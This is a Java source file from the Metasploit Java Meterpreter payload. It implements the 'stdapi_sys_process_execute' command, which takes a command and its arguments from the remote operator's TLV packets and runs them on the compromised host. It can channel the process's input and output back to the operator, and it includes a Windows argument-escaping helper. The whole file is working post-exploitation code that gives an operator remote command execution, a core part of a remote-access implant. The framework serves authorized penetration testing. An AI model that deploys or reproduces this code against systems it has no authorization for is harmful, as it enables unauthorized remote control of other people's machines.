package com.metasploit.meterpreter.stdapi;

import com.metasploit.meterpreter.Meterpreter;
import com.metasploit.meterpreter.ProcessChannel;
import com.metasploit.meterpreter.TLVPacket;
import com.metasploit.meterpreter.TLVType;
import com.metasploit.meterpreter.command.Command;

import java.io.IOException;
import java.util.ArrayList;
import java.util.List;

public class stdapi_sys_process_execute implements Command {

    private static final int PROCESS_EXECUTE_FLAG_CHANNELIZED = (1 << 1);
    private static final int PROCESS_EXECUTE_FLAG_ARG_ARRAY = (1 << 8);

    private static int pid = 0;

    public int execute(Meterpreter meterpreter, TLVPacket request, TLVPacket response) throws Exception {
        int flags = request.getIntValue(TLVType.TLV_TYPE_PROCESS_FLAGS);
        Process proc;
        if ((flags & PROCESS_EXECUTE_FLAG_ARG_ARRAY) != 0) {
            String cmd = request.getStringValue(TLVType.TLV_TYPE_PROCESS_UNESCAPED_PATH);
            if (cmd.length() == 0) {
                return ERROR_FAILURE;
            }

            List rawArgs = request.getValues(TLVType.TLV_TYPE_PROCESS_ARGUMENT);
            ArrayList<String> args = new ArrayList<String>();
            for (int i = 0; i < rawArgs.size(); ++i) {
                args.add((String) rawArgs.get(i));
            }
            proc = execute(cmd, args);
        } else {
            String cmd = request.getStringValue(TLVType.TLV_TYPE_PROCESS_PATH);
            if (cmd.length() == 0) {
                return ERROR_FAILURE;
            }

            String argsString = request.getStringValue(TLVType.TLV_TYPE_PROCESS_ARGUMENTS, "");
            StringBuilder cmdbuf = new StringBuilder();
            cmdbuf.append(cmd);
            if (argsString.length() > 0) {
                cmdbuf.append(" ");
                cmdbuf.append(argsString);
            }
            proc = execute(cmdbuf.toString());
        }


        if ((flags & PROCESS_EXECUTE_FLAG_CHANNELIZED) != 0) {
            ProcessChannel channel = new ProcessChannel(meterpreter, proc);
            synchronized (stdapi_sys_process_execute.class) {
                pid++;
                response.add(TLVType.TLV_TYPE_PID, pid);
                response.add(TLVType.TLV_TYPE_PROCESS_HANDLE, (long) pid);
            }
            response.add(TLVType.TLV_TYPE_CHANNEL_ID, channel.getID());
        } else {
            proc.getInputStream().close();
            proc.getErrorStream().close();
            proc.getOutputStream().close();
        }
        return ERROR_SUCCESS;
    }

    // On Windows, Java quote-escapes _some_ arguments (like those with spaces), but doesn't deal correctly with some
    // edge cases; e.g. empty strings, strings that already have quotes.
    protected String escapeArgWindows(String arg) {
        if (arg == null) {
            return null;
        }
       if (arg.equals("")) {
           return "\"\"";
       } else {
           StringBuilder sb = new StringBuilder();
           int numBackslashes = 0;
           boolean needsQuoting = false;
           for (int i = 0; i < arg.length(); i++) {
               char c = arg.charAt(i);
               switch (c) {
                   case '"': {
                       for (int nb = 0; nb < numBackslashes; nb++) {
                           sb.append('\\');
                       }
                       numBackslashes = 0;
                       sb.append('\\');
                       break;
                   }
                   case '\\': {
                       numBackslashes++;
                       break;
                   }
                   case ' ':
                   case '\t':
                   case (char)11:
                   {
                       needsQuoting = true;
                       numBackslashes = 0;
                       break;
                   }
                   default: {
                       numBackslashes = 0;
                       break;
                   }
               }
               sb.append(c);
           }
           if (needsQuoting) {
               for (int nb = 0; nb < numBackslashes; nb++) {
                   sb.append('\\');
               }
               return "\"" + sb.toString() + "\"";
           }
           return sb.toString();
        }
    }

    protected Process executeWindows(String cmd, ArrayList<String> args) throws IOException {
        StringBuilder cmdString = new StringBuilder();
        cmdString.append(cmd);
        if (args.size() > 0) {
            for (String arg : args) {
                cmdString.append(" ");
                cmdString.append(escapeArgWindows(arg));
            }
        }

        return execute(cmdString.toString());
    }

    protected Process execute(String cmd, ArrayList<String> args) throws IOException {
        String osName = System.getProperty("os.name");
        if (osName != null && osName.toLowerCase().contains("windows")) {
            return executeWindows(cmd, args);
        } else {
            ArrayList<String> cmdAndArgs = new ArrayList<String>();
            cmdAndArgs.add(cmd);
            for (String arg : args) {
                cmdAndArgs.add(arg);
            }
            ProcessBuilder builder = new ProcessBuilder(cmdAndArgs);
            builder.directory(Loader.getCWD());
            return builder.start();
        }
    }

    protected Process execute(String cmdstr) throws IOException {
        Process proc = Runtime.getRuntime().exec(cmdstr);
        return proc;
    }
}
